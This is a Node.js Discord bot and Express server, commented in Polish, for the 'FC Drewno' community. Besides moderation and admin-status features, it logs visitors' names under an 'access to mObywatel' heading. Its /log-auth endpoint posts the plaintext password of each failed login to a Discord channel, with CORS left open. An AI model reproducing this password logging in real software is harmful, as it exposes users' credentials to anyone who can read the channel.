import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder, MessageFlags } from 'discord.js';
import express from 'express';
import cors from 'cors';
import https from 'https';

const app = express();
app.use(cors());
app.use(express.json());

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// KONFIGURACJA ID
const GUILD_ID = '1439591884287639694';
const ROLE_ID = '1439593337488150568';
const ANNOUNCEMENT_CHANNEL_ID = '1453854451961041164'; 
const LOG_CHANNEL_ID = '1457442534396530809'; 
const WEBSITE_CHANNEL_NAME = 'strona';

const APP_URL = process.env.APP_URL || `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` || `https://discord-api-jqj5.onrender.com`;

let cachedAdmins = null;
let lastFetchTime = 0;
const CACHE_DURATION = 1200000;

const commands = [
    new SlashCommandBuilder()
        .setName('clear')
        .setDescription('Usuwa wiadomości')
        .addIntegerOption(option => 
            option.setName('amount')
                .setDescription('Liczba (1-100)')
                .setRequired(true))
        .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages)
].map(command => command.toJSON());

function startSelfPing() {
    if (!APP_URL || APP_URL.includes('undefined')) return;
    setInterval(() => {
        https.get(APP_URL, (res) => {
            console.log(`Self-ping OK: Status ${res.statusCode}`);
        }).on('error', (err) => {
            console.error('Ping error:', err.message);
        });
    }, 120000); 
}

// --- ENDPOINT: LOGOWANIE WEJŚĆ (EXISTING) ---
app.post('/log-access', async (req, res) => {
    try {
        const { name, surname, page } = req.body;
        const channel = await client.channels.fetch(LOG_CHANNEL_ID).catch(() => null);
        
        if (!channel) return res.status(404).json({ error: "Kanał nie istnieje" });

        const embed = new EmbedBuilder()
            .setColor(0x3498db)
            .setTitle('🔓 Uzyskano dostęp do mObywatela')
            .addFields(
                { name: '👤 Osoba', value: `**${name} ${surname}**`, inline: true },
                { name: '📄 Widok', value: `\`${page}\``, inline: true },
                { name: '⏰ Czas', value: `<t:${Math.floor(Date.now() / 1000)}:T> (<t:${Math.floor(Date.now() / 1000)}:R>)`, inline: false }
            )
            .setTimestamp()
            .setFooter({ text: 'System Logowania Dostępu' });

        await channel.send({ embeds: [embed] });
        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error('Błąd logowania wejścia:', error);
        res.status(500).json({ error: "Błąd serwera" });
    }
});

// --- NOWY ENDPOINT: LOGOWANIE PRÓB AUTORYZACJI ---
app.post('/log-auth', async (req, res) => {
    try {
        const { login, success, passwordUsed } = req.body;
        const channel = await client.channels.fetch(LOG_CHANNEL_ID).catch(() => null);
        
        if (!channel) return res.status(404).json({ error: "Kanał nie istnieje" });

        const embed = new EmbedBuilder()
            .setColor(success ? 0x2ecc71 : 0xe74c3c)
            .setTitle(success ? '✅ Udane logowanie' : '❌ Nieudana próba logowania')
            .addFields(
                { name: '📂 Folder/Użytkownik', value: `\`${login}\``, inline: true },
                { name: '🔑 Hasło', value: success ? `*Ukryte*` : `\`${passwordUsed}\``, inline: true },
                { name: '⏰ Czas', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false }
            )
            .setTimestamp()
            .setFooter({ text: 'Monitor Bezpieczeństwa' });

        await channel.send({ embeds: [embed] });
        res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error('Błąd logowania autoryzacji:', error);
        res.status(500).json({ error: "Błąd serwera" });
    }
});

// --- KOMENDA CLEAR (POPRAWIONA) ---
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'clear') {
        const amount = interaction.options.getInteger('amount');
        
        try {
            if (interaction.deferred || interaction.replied) return;

            await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });

            if (amount < 1 || amount > 100) {
                return await interaction.editReply({ content: 'Podaj liczbę od 1 do 100.' });
            }

            const deleted = await interaction.channel.bulkDelete(amount, true);
            await interaction.editReply({ content: `Pomyślnie usunięto ${deleted.size} wiadomości.` });
        } catch (error) {
            console.error('Błąd komendy clear:', error);
            if (interaction.deferred) {
                await interaction.editReply({ content: 'Wystąpił błąd (wiadomości mogą być starsze niż 14 dni).' }).catch(() => {});
            }
        }
    }
});

// --- ADMINI I STATUS ---
app.get('/admins', async (req, res) => {
    try {
        const now = Date.now();
        if (cachedAdmins && (now - lastFetchTime < CACHE_DURATION)) return res.json(cachedAdmins);
        const guild = client.guilds.cache.get(GUILD_ID) || await client.guilds.fetch(GUILD_ID);
        const members = await guild.members.fetch();
        const admins = members.filter(m => m.roles.cache.has(ROLE_ID)).map(m => ({
            id: m.id,
            username: m.user.username,
            avatar: m.user.displayAvatarURL({ extension: 'png', size: 128 }),
            status: m.presence ? m.presence.status : 'offline',
            game: m.presence?.activities.find(act => act.type === 0)?.name || null
        }));
        cachedAdmins = admins;
        lastFetchTime = now;
        res.json(admins);
    } catch (error) { res.status(500).json({ error: "Błąd" }); }
});

async function updateWebsiteStatus() {
    try {
        const guild = client.guilds.cache.get(GUILD_ID) || await client.guilds.fetch(GUILD_ID);
        const channel = guild.channels.cache.find(ch => ch.name === WEBSITE_CHANNEL_NAME);
        if (!channel) return;
        const embed = new EmbedBuilder()
            .setColor(0x2ecc71)
            .setTitle('🌐 Oficjalna Strona FC Drewno')
            .setURL('https://resdextoes.github.io/FC_Drewno/')
            .addFields(
                { name: 'Adres strony', value: '[Kliknij tutaj](https://resdextoes.github.io/FC_Drewno/)' },
                { name: 'Auto-aktualizacja', value: `<t:${Math.floor(Date.now() / 1000)}:R>`, inline: true },
                { name: 'Status bota', value: '🟢 Aktywny', inline: true }
            )
            .setTimestamp();

        const messages = await channel.messages.fetch({ limit: 5 });
        const lastBotMessage = messages.find(m => m.author.id === client.user.id);
        if (lastBotMessage) await lastBotMessage.edit({ embeds: [embed] });
        else await channel.send({ embeds: [embed] });
    } catch (e) { console.error('Status Error:', e.message); }
}

// --- START ---
client.once('ready', async () => {
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationGuildCommands(client.user.id, GUILD_ID), { body: commands });
        console.log(`Bot online: ${client.user.tag}`);
        startSelfPing();
    } catch (error) { console.error(error); }
});

app.get('/', (req, res) => res.status(200).send('Bot is alive!'));
const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => console.log(`Serwer na porcie: ${PORT}`));

client.login(process.env.DISCORD_TOKEN).then(() => {
    setTimeout(updateWebsiteStatus, 5000);
    setInterval(updateWebsiteStatus, 300000);
});